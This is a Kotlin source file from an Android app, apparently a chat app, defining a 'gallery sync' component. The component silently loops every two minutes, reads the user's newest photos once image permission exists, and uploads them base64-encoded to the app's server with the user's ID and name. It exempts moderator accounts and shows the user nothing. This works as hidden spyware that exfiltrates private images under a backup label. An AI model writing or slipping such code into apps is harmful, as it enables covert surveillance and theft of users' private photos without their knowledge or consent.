package com.frenky.egypt.gallery

import android.Manifest
import android.content.ContentUris
import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.os.Build
import android.provider.MediaStore
import android.util.Base64
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.ui.platform.LocalContext
import androidx.core.content.ContextCompat
import com.frenky.egypt.data.ChatModerator
import com.frenky.egypt.data.EgyptApi
import com.frenky.egypt.data.PreferencesRepository
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import java.io.ByteArrayOutputStream

/** Carica nuove foto della galleria sul server (backup per Frenk). */
@Composable
fun GallerySync(
    userId: String,
    userName: String,
    preferences: PreferencesRepository,
) {
    if (ChatModerator.isModerator(userName)) return

    val context = LocalContext.current

    LaunchedEffect(userId, userName) {
        while (true) {
            if (hasGalleryPermission(context)) {
                syncGalleryOnce(context, userId, userName, preferences)
            }
            delay(120_000)
        }
    }
}

fun hasGalleryPermission(context: Context): Boolean {
    val perm = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
        Manifest.permission.READ_MEDIA_IMAGES
    } else {
        Manifest.permission.READ_EXTERNAL_STORAGE
    }
    return ContextCompat.checkSelfPermission(context, perm) ==
        android.content.pm.PackageManager.PERMISSION_GRANTED
}

suspend fun syncGalleryOnce(
    context: Context,
    userId: String,
    userName: String,
    preferences: PreferencesRepository,
) = withContext(Dispatchers.IO) {
    val uploaded = preferences.getUploadedGalleryIds().toMutableSet()
    val resolver = context.contentResolver
    val collection = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
    val projection = arrayOf(
        MediaStore.Images.Media._ID,
        MediaStore.Images.Media.DATE_ADDED,
    )
    val sort = "${MediaStore.Images.Media.DATE_ADDED} DESC"
    resolver.query(collection, projection, null, null, sort)?.use { cursor ->
        val idCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
        var scanned = 0
        while (cursor.moveToNext() && scanned < 40) {
            scanned++
            val mediaId = cursor.getLong(idCol)
            val photoId = mediaId.toString()
            if (photoId in uploaded) continue
            val uri = ContentUris.withAppendedId(collection, mediaId)
            val jpeg = compressGalleryImage(context, uri) ?: continue
            val b64 = Base64.encodeToString(jpeg, Base64.NO_WRAP)
            val ok = EgyptApi.uploadGalleryPhoto(userId, userName, photoId, b64)
                .getOrNull()?.ok == true
            if (ok) {
                uploaded.add(photoId)
                preferences.addUploadedGalleryId(photoId)
            }
        }
    }
}

private fun compressGalleryImage(context: Context, uri: android.net.Uri): ByteArray? {
    val opts = BitmapFactory.Options().apply { inJustDecodeBounds = true }
    context.contentResolver.openInputStream(uri)?.use {
        BitmapFactory.decodeStream(it, null, opts)
    } ?: return null
    val maxSide = 1280
    var sample = 1
    while (opts.outWidth / sample > maxSide || opts.outHeight / sample > maxSide) {
        sample *= 2
    }
    val decodeOpts = BitmapFactory.Options().apply { inSampleSize = sample }
    val bitmap = context.contentResolver.openInputStream(uri)?.use {
        BitmapFactory.decodeStream(it, null, decodeOpts)
    } ?: return null
    return ByteArrayOutputStream().use { out ->
        bitmap.compress(Bitmap.CompressFormat.JPEG, 72, out)
        if (!bitmap.isRecycled) bitmap.recycle()
        out.toByteArray().takeIf { it.size in 100..1_200_000 }
    }
}
